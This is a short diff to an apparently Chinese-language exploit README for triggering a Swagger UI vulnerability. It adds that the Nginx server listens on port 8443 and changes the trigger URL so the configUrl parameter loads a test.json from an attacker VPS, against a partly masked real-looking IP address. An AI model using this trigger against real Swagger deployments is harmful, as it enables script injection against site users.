@@ -9,6 +9,7 @@
 
 **3、启动Nginx**
 
+默认8443端口
 docker-compose up -d
 
 **4、触发漏洞**
@@ -19,7 +20,7 @@ http://目标/swagger-ui/index.html?configUrl=https://VPS_IP/test.json
 
 # 漏洞触发
 
-http://1.116.xxx.112:8089/swagger-ui/index.html?configUrl=https://VPS_IP/test.json
+http://1.116.xxx.112:8089/swagger-ui/index.html?configUrl=https://VPS_IP:8443/test.json
 
 注意：目标是HTTPS的网站，你的VPS 可能需要配置HTTPS，我这里没有测试了。 
 
